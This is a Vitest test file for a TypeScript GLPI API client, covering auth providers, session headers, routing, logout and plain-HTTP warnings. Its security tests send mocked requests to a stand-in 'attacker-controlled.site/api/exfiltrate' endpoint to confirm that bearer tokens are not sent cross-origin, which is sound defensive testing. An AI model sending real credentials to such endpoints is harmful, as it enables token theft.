import { describe, it, expect, vi } from 'vitest';
import { GlpiClient } from '../src/client.js';
import {
  PasswordAuthProvider,
  AuthorizationCodeAuthProvider,
  ClientCredentialsAuthProvider,
} from '../src/auth/index.js';
import { GlpiAuthenticationError, GlpiError } from '../src/errors/index.js';
import type { IAuthProvider } from '../src/auth/types.js';

describe('GlpiClient initialization', () => {
  it('instantiates resources and sets session scoping headers', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
    });

    expect(client.tickets).toBeDefined();
    expect(client.computers).toBeDefined();
    expect(client.users).toBeDefined();
    expect(client.documents).toBeDefined();
    expect(client.graphql).toBeDefined();

    client.setEntity(2, true);
    client.setProfile(4);
    client.setLanguage('en_US');

    expect(client.getEntity()).toEqual({ entityId: 2, recursive: true });
    expect(client.getProfile()).toBe(4);
    expect(client.getLanguage()).toBe('en_US');
  });

  it('allows generic resource resolution and custom registration', () => {
    const client = new GlpiClient({ apiUrl: 'https://glpi.corp.com/api.php' });
    client.registerResource('Rack', 'Assets/Rack');

    const rackService = client.resource('Rack');
    expect(rackService).toBeDefined();
    expect(rackService.getBasePath()).toBe('/Assets/Rack');
  });

  it('throws an error if apiUrl is missing or empty', () => {
    expect(() => new GlpiClient({ apiUrl: '' })).toThrow(GlpiError);
  });

  it('initializes with custom routes from options', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      routes: {
        Server: 'Assets/Server',
        Location: 'Dropdowns/Location',
      },
    });

    const serverService = client.resource('Server');
    expect(serverService.getBasePath()).toBe('/Assets/Server');
    const locationService = client.resource('Location');
    expect(locationService.getBasePath()).toBe('/Dropdowns/Location');
  });

  it('handles clearing of scoping headers', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
    });

    client.setEntity(1, false);
    client.setProfile(2);
    client.setLanguage('fr_FR');

    expect(client.getEntity()).toEqual({ entityId: 1, recursive: false });
    expect(client.getProfile()).toBe(2);
    expect(client.getLanguage()).toBe('fr_FR');

    client.setEntity(undefined);
    client.setProfile(undefined);
    client.setLanguage(undefined);

    expect(client.getEntity()).toBeUndefined();
    expect(client.getProfile()).toBeUndefined();
    expect(client.getLanguage()).toBeUndefined();
  });

  it('instantiates PasswordAuthProvider from config object', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: {
        type: 'password',
        username: 'glpi',
        password: 'password',
        clientId: 'client123',
      },
    });

    expect(client.authProvider).toBeInstanceOf(PasswordAuthProvider);
    expect(client.auth).toBe(client.authProvider);
  });

  it('instantiates AuthorizationCodeAuthProvider from config object', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: {
        type: 'authorization_code',
        clientId: 'oauth-client',
        code: 'auth-code-123',
        redirectUri: 'https://app.example.com/callback',
      },
    });

    expect(client.authProvider).toBeInstanceOf(AuthorizationCodeAuthProvider);
  });

  it('instantiates ClientCredentialsAuthProvider from config object', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: {
        type: 'client_credentials',
        clientId: 'agent-client',
        clientSecret: 'secret123',
      },
    });

    expect(client.authProvider).toBeInstanceOf(ClientCredentialsAuthProvider);
  });

  it('accepts an existing IAuthProvider instance directly', () => {
    const customAuth: IAuthProvider = {
      getAccessToken: vi.fn().mockResolvedValue('custom-jwt'),
      invalidateToken: vi.fn().mockResolvedValue(undefined),
      logout: vi.fn().mockResolvedValue(undefined),
    };

    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: customAuth,
    });

    expect(client.authProvider).toBe(customAuth);
  });

  it('login() calls authProvider.getAccessToken()', async () => {
    const customAuth: IAuthProvider = {
      getAccessToken: vi.fn().mockResolvedValue('test-token-123'),
      invalidateToken: vi.fn().mockResolvedValue(undefined),
      logout: vi.fn().mockResolvedValue(undefined),
    };

    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: customAuth,
    });

    const token = await client.login();
    expect(token).toBe('test-token-123');
    expect(customAuth.getAccessToken).toHaveBeenCalledOnce();
  });

  it('login() throws GlpiAuthenticationError if no auth provider is configured', async () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
    });

    await expect(client.login()).rejects.toThrow(GlpiAuthenticationError);
  });

  it('logout() deletes /session and calls authProvider.logout()', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(null, { status: 204 }));
    const customAuth: IAuthProvider = {
      getAccessToken: vi.fn().mockResolvedValue('tok'),
      invalidateToken: vi.fn().mockResolvedValue(undefined),
      logout: vi.fn().mockResolvedValue(undefined),
    };

    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      auth: customAuth,
      fetch: fetchMock,
    });

    await client.logout();

    expect(fetchMock).toHaveBeenCalledWith(
      'https://glpi.corp.com/api.php/v2/session',
      expect.objectContaining({ method: 'DELETE' })
    );
    expect(customAuth.logout).toHaveBeenCalledOnce();
  });

  it('forwards proxy and noProxy options to underlying http transport', () => {
    const client = new GlpiClient({
      apiUrl: 'https://glpi.corp.com/api.php',
      proxy: 'http://proxy.corp:8080',
      noProxy: ['glpi.corp.com'],
    });

    expect((client as any).rootHttp.shouldBypassProxy('https://glpi.corp.com/api.php')).toBe(true);
    expect((client as any).rootHttp.shouldBypassProxy('https://other.com/api.php')).toBe(false);
  });

  describe('Security: Cross-Origin Token Exfiltration Protection (VULN-02)', () => {
    it('does not attach Authorization header to external absolute URLs', async () => {
      const fetchMock = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ external: true }), { status: 200 })
      );
      const customAuth: IAuthProvider = {
        getAccessToken: vi.fn().mockResolvedValue('super-secret-glpi-token'),
        invalidateToken: vi.fn().mockResolvedValue(undefined),
        logout: vi.fn().mockResolvedValue(undefined),
      };

      const client = new GlpiClient({
        apiUrl: 'https://glpi.corp.com/api.php',
        auth: customAuth,
        fetch: fetchMock,
      });

      // 1. External absolute URL: Bearer token must NOT be injected
      await client.http.get('https://attacker-controlled.site/api/exfiltrate');
      expect(fetchMock).toHaveBeenCalledWith(
        'https://attacker-controlled.site/api/exfiltrate',
        expect.objectContaining({
          headers: expect.not.objectContaining({
            Authorization: 'Bearer super-secret-glpi-token',
          }),
        })
      );
      const callHeaders = fetchMock.mock.calls[0][1].headers;
      const authHeader = callHeaders instanceof Headers
        ? callHeaders.get('authorization')
        : callHeaders?.['Authorization'] ?? callHeaders?.['authorization'];
      expect(authHeader).toBeFalsy();

      // 2. Same-origin relative path: Bearer token MUST be injected
      fetchMock.mockResolvedValueOnce(new Response(JSON.stringify({ ok: true }), { status: 200 }));
      await client.http.get('/Assistance/Ticket');
      const call2Headers = fetchMock.mock.calls[1][1].headers;
      const authHeader2 = call2Headers instanceof Headers
        ? call2Headers.get('authorization')
        : call2Headers?.['Authorization'] ?? call2Headers?.['authorization'];
      expect(authHeader2).toBe('Bearer super-secret-glpi-token');

      // 3. Same-origin absolute URL: Bearer token MUST be injected
      fetchMock.mockResolvedValueOnce(new Response(JSON.stringify({ ok: true }), { status: 200 }));
      await client.http.get('https://glpi.corp.com/api.php/v2/Assistance/Ticket');
      const call3Headers = fetchMock.mock.calls[2][1].headers;
      const authHeader3 = call3Headers instanceof Headers
        ? call3Headers.get('authorization')
        : call3Headers?.['Authorization'] ?? call3Headers?.['authorization'];
      expect(authHeader3).toBe('Bearer super-secret-glpi-token');
    });

    it('does not retry 401 on external absolute URLs or invalidate token', async () => {
      const fetchMock = vi.fn().mockResolvedValue(
        new Response('Unauthorized', { status: 401, statusText: 'Unauthorized' })
      );
      const customAuth: IAuthProvider = {
        getAccessToken: vi.fn().mockResolvedValue('super-secret-glpi-token'),
        invalidateToken: vi.fn().mockResolvedValue(undefined),
        logout: vi.fn().mockResolvedValue(undefined),
      };

      const client = new GlpiClient({
        apiUrl: 'https://glpi.corp.com/api.php',
        auth: customAuth,
        fetch: fetchMock,
      });

      await expect(
        client.http.get('https://attacker-controlled.site/api/401')
      ).rejects.toThrow();

      // Token invalidation must NOT have been called for external URL
      expect(customAuth.invalidateToken).not.toHaveBeenCalled();
      expect(fetchMock).toHaveBeenCalledTimes(1);
    });
  });

  describe('Security: Unencrypted HTTP warning (VULN-08)', () => {
    it('warns when apiUrl uses unencrypted http:// on remote hosts with custom logger', () => {
      const mockLogger = {
        debug: vi.fn(),
        info: vi.fn(),
        warn: vi.fn(),
        error: vi.fn(),
      };

      new GlpiClient({
        apiUrl: 'http://glpi.corp.com/api.php',
        logger: mockLogger,
      });

      expect(mockLogger.warn).toHaveBeenCalledTimes(1);
      expect(mockLogger.warn).toHaveBeenCalledWith(
        expect.stringContaining('[SECURITY WARNING] GlpiClient is configured with an unencrypted HTTP URL')
      );
    });

    it('warns on console.warn when apiUrl uses unencrypted http:// without custom logger', () => {
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});

      try {
        new GlpiClient({
          apiUrl: 'http://remote-server.glpi.org/api.php',
        });

        expect(consoleWarnSpy).toHaveBeenCalledTimes(1);
        expect(consoleWarnSpy).toHaveBeenCalledWith(
          expect.stringContaining('[SECURITY WARNING] GlpiClient is configured with an unencrypted HTTP URL')
        );
      } finally {
        consoleWarnSpy.mockRestore();
      }
    });

    it('does not warn when using http:// on localhost, 127.0.0.1, or loopback IPv6', () => {
      const mockLogger = {
        debug: vi.fn(),
        info: vi.fn(),
        warn: vi.fn(),
        error: vi.fn(),
      };

      new GlpiClient({ apiUrl: 'http://localhost/api.php', logger: mockLogger });
      new GlpiClient({ apiUrl: 'http://127.0.0.1/api.php', logger: mockLogger });
      new GlpiClient({ apiUrl: 'http://app.localhost/api.php', logger: mockLogger });
      new GlpiClient({ apiUrl: 'http://[::1]/api.php', logger: mockLogger });

      expect(mockLogger.warn).not.toHaveBeenCalled();
    });

    it('does not warn when using https://', () => {
      const mockLogger = {
        debug: vi.fn(),
        info: vi.fn(),
        warn: vi.fn(),
        error: vi.fn(),
      };

      new GlpiClient({ apiUrl: 'https://glpi.corp.com/api.php', logger: mockLogger });

      expect(mockLogger.warn).not.toHaveBeenCalled();
    });
  });
});

